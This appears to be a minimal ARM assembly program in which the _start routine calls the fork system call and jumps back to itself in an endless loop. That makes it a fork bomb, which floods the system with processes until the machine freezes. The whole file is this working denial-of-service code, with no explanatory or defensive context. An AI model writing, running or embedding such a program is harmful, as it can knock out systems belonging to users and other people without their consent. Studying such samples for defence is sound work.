.global _start
.section .text
_start:
	mov r7, #0x02 // fork syscall
	swi 0
	b _start // goto label _start
